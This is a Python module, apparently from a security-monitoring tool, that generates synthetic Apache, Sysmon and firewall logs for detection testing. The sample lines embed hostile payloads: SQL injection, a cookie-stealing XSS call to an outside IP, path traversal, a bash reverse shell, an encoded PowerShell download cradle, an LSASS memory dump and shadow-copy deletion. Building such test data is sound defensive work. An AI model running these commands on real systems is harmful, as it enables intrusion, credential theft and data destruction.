"""
Utilities & Sample Log Generator Module.
Provides realistic sample log datasets (Apache Web Attacks, Windows Sysmon/Event Logs,
Ransomware Activity, Auth Brute Force) for instant 1-click evaluation,
along with desktop notification and logging helpers.
"""

import os
import logging
from datetime import datetime, timezone, timedelta
from typing import Dict, Any, List
import pandas as pd
from modules.config import SAMPLE_LOGS_DIR

# Configure standard SOC application logger
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] (%(name)s) %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("SOCSentinel")

class SampleDataGenerator:
    """Generates realistic enterprise security telemetry for immediate testing."""

    @classmethod
    def generate_apache_attack_logs(cls) -> str:
        """Returns realistic Apache web server logs with SQLi, XSS, LFI, and scanner traffic."""
        now = datetime.now(timezone.utc)
        t1 = (now - timedelta(minutes=45)).strftime("%d/%b/%Y:%H:%M:%S +0000")
        t2 = (now - timedelta(minutes=30)).strftime("%d/%b/%Y:%H:%M:%S +0000")
        t3 = (now - timedelta(minutes=20)).strftime("%d/%b/%Y:%H:%M:%S +0000")
        t4 = (now - timedelta(minutes=10)).strftime("%d/%b/%Y:%H:%M:%S +0000")
        t5 = (now - timedelta(minutes=5)).strftime("%d/%b/%Y:%H:%M:%S +0000")

        return f"""198.51.100.45 - - [{t1}] "GET /login.php?user=admin' UNION SELECT null,username,password FROM users-- HTTP/1.1" 200 4820 "-" "sqlmap/1.5.2"
198.51.100.45 - - [{t1}] "GET /products.php?id=1' OR '1'='1 HTTP/1.1" 200 3512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
203.0.113.19 - - [{t2}] "POST /comments.php HTTP/1.1" 200 1204 "https://victim.corp/comments" "<script>alert(document.cookie);</script>"
203.0.113.19 - - [{t2}] "GET /search.php?q=<img src=x onerror=this.src='http://203.0.113.19/log?c='+document.cookie> HTTP/1.1" 200 890 "-" "Mozilla/5.0"
185.220.101.5 - - [{t3}] "GET /download.php?file=../../../../../../etc/passwd HTTP/1.1" 200 1890 "-" "Nikto/2.1.6"
185.220.101.5 - - [{t3}] "GET /view.php?page=..%2f..%2f..%2fwindows%2fsystem32%2fcmd.exe HTTP/1.1" 404 312 "-" "Nikto/2.1.6"
45.33.32.156 - - [{t4}] "POST /api/exec.php HTTP/1.1" 200 650 "-" "; cat /etc/passwd; id; whoami"
45.33.32.156 - - [{t4}] "GET /cgi-bin/test.cgi?cmd=bash+-i+>&+/dev/tcp/45.33.32.156/4444+0>&1 HTTP/1.1" 200 210 "-" "curl/7.68.0"
192.168.1.105 - - [{t5}] "POST /auth/token HTTP/1.1" 401 245 "-" "Python-requests/2.25.1"
192.168.1.105 - - [{t5}] "POST /auth/token HTTP/1.1" 401 245 "-" "Python-requests/2.25.1"
192.168.1.105 - - [{t5}] "POST /auth/token HTTP/1.1" 401 245 "-" "Python-requests/2.25.1"
192.168.1.105 - - [{t5}] "POST /auth/token HTTP/1.1" 401 245 "-" "Python-requests/2.25.1"
192.168.1.105 - - [{t5}] "POST /auth/token HTTP/1.1" 401 245 "-" "Python-requests/2.25.1"
192.168.1.105 - - [{t5}] "POST /auth/token HTTP/1.1" 401 245 "-" "Python-requests/2.25.1"
192.168.1.50 - - [{t5}] "GET /api/heartbeat?id=agent_883 HTTP/1.1" 200 64 "-" "Go-http-client/1.1"
192.168.1.50 - - [{t5}] "GET /api/heartbeat?id=agent_883 HTTP/1.1" 200 64 "-" "Go-http-client/1.1"
192.168.1.50 - - [{t5}] "GET /api/heartbeat?id=agent_883 HTTP/1.1" 200 64 "-" "Go-http-client/1.1"
"""

    @classmethod
    def generate_windows_sysmon_csv(cls) -> str:
        """Returns realistic Windows Sysmon & Security Event Log CSV."""
        now = datetime.now(timezone.utc)
        t1 = (now - timedelta(minutes=15)).isoformat()
        t2 = (now - timedelta(minutes=10)).isoformat()
        t3 = (now - timedelta(minutes=5)).isoformat()

        return f"""TimeCreated,EventID,SourceIp,DestinationIp,ProcessName,CommandLine,Message
{t1},4625,185.220.101.5,10.0.0.15,lsass.exe,,"An account failed to log on. Account Name: Administrator. Failure Reason: Unknown user name or bad password."
{t1},4625,185.220.101.5,10.0.0.15,lsass.exe,,"An account failed to log on. Account Name: root. Failure Reason: Unknown user name or bad password."
{t1},4625,185.220.101.5,10.0.0.15,lsass.exe,,"An account failed to log on. Account Name: svc_sql. Failure Reason: Unknown user name or bad password."
{t1},4625,185.220.101.5,10.0.0.15,lsass.exe,,"An account failed to log on. Account Name: backup_admin. Failure Reason: Unknown user name or bad password."
{t1},4625,185.220.101.5,10.0.0.15,lsass.exe,,"An account failed to log on. Account Name: admin. Failure Reason: Unknown user name or bad password."
{t2},1,10.0.0.15,198.51.100.45,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4ANAA1AC8AcABheWxvYWQucHMxIikA","Process Creation: PowerShell spawned with encoded payload"
{t2},10,10.0.0.15,10.0.0.15,procdump64.exe,"procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp","Process Access: Memory dump performed on LSASS credential vault"
{t3},1,10.0.0.15,10.0.0.15,vssadmin.exe,"vssadmin delete shadows /all /quiet","Process Creation: Volume Shadow Copy deletion attempted by Ransomware"
{t3},11,10.0.0.15,194.26.29.112,svchost.exe,"svchost.exe -k netsvcs","File created: C:\\Users\\Administrator\\Desktop\\README_FOR_DECRYPT.txt and files changed to .locked"
"""

    @classmethod
    def generate_json_firewall_logs(cls) -> str:
        """Returns JSON firewall log events with port scans and exfiltration."""
        now = datetime.now(timezone.utc).isoformat()
        events = [
            {"timestamp": now, "src_ip": "45.33.32.156", "dst_ip": "10.0.0.5", "action": "DROP", "port": 21, "details": "SYN probe to port 21 FTP"},
            {"timestamp": now, "src_ip": "45.33.32.156", "dst_ip": "10.0.0.5", "action": "DROP", "port": 22, "details": "SYN probe to port 22 SSH"},
            {"timestamp": now, "src_ip": "45.33.32.156", "dst_ip": "10.0.0.5", "action": "DROP", "port": 23, "details": "SYN probe to port 23 Telnet"},
            {"timestamp": now, "src_ip": "45.33.32.156", "dst_ip": "10.0.0.5", "action": "DROP", "port": 80, "details": "SYN probe to port 80 HTTP"},
            {"timestamp": now, "src_ip": "45.33.32.156", "dst_ip": "10.0.0.5", "action": "DROP", "port": 443, "details": "SYN probe to port 443 HTTPS"},
            {"timestamp": now, "src_ip": "45.33.32.156", "dst_ip": "10.0.0.5", "action": "DROP", "port": 445, "details": "SYN probe to port 445 SMB"},
            {"timestamp": now, "src_ip": "45.33.32.156", "dst_ip": "10.0.0.5", "action": "DROP", "port": 3389, "details": "SYN probe to port 3389 RDP"},
            {"timestamp": now, "src_ip": "10.0.0.22", "dst_ip": "194.26.29.112", "action": "ALLOW", "bytes_sent": 845200000, "details": "Exfiltration staging: massive outbound tar -czf transfer to mega.nz"}
        ]
        import json
        return json.dumps(events, indent=2)

    @classmethod
    def write_sample_files_to_disk(cls) -> None:
        """Writes sample logs to the data/sample_logs/ folder for user download or one-click analysis."""
        os.makedirs(SAMPLE_LOGS_DIR, exist_ok=True)
        
        with open(os.path.join(SAMPLE_LOGS_DIR, "apache_attack_access.log"), "w", encoding="utf-8") as f:
            f.write(cls.generate_apache_attack_logs())

        with open(os.path.join(SAMPLE_LOGS_DIR, "windows_sysmon_events.csv"), "w", encoding="utf-8") as f:
            f.write(cls.generate_windows_sysmon_csv())

        with open(os.path.join(SAMPLE_LOGS_DIR, "firewall_network_events.json"), "w", encoding="utf-8") as f:
            f.write(cls.generate_json_firewall_logs())
